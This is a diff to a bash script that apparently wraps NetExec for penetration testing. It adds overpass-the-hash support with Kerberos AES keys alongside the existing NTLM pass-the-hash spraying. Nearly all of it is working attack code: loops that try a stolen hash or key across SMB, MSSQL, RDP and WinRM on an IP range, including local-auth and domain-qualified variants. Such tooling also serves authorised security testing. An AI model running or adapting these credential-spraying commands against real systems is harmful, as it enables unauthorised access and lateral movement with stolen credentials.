@@ -14,7 +14,7 @@ usage() {
     echo -e "Usage: $0 -i [ip] -u [user] (-p <password> | -H <hash> | -k) -d <domain> [-P]\n"
     echo "Flags:"
     echo -e "\t-p: password authentication"
-    echo -e "\t-H: pass-the-hash authentication (NTLM hash)"
+    echo -e "\t-H: PtH (32-char NTLM hash) or OPtH (64/128-char AES key)"
     echo -e "\t-k: Kerberos authentication (uses current TGT from ccache)"
     echo -e "\t-d: domain to authenticate against (only used with password/hash based authenticataion)"
     echo -e "\t-P: enable proxychains4"
@@ -122,14 +122,29 @@ if [[ -n "$password" ]]; then
 fi
 
 if [[ -n "$hash" ]]; then
-    for proto in smb mssql rdp winrm; do
-        is_ignored "$proto" && continue
-        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
-        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success --local-auth"
-        if [[ -n "$domain" ]]; then
-            run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
-        fi
-    done
+    hash_len=$(echo -n "$hash" | wc -c)
+    case "$hash_len" in
+        32)
+            for proto in smb mssql rdp winrm; do
+                is_ignored "$proto" && continue
+                run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
+                run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success --local-auth"
+                if [[ -n "$domain" ]]; then
+                    run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
+                fi
+            done
+            ;;
+        64|128)
+            for proto in smb mssql rdp winrm; do
+                is_ignored "$proto" && continue
+                run_cmd "${NXC} $proto $iprange -u $user -d $domain --aesKey $hash --continue-on-success"
+            done
+            ;;
+        *)
+            echo "[-] Error: unrecognized hash length (${hash_len} characters). Expected 32 hex chars for an NTLM hash, or 64/128 hex chars for an AES key."
+            exit 1
+            ;;
+    esac
     exit 0
 fi
 
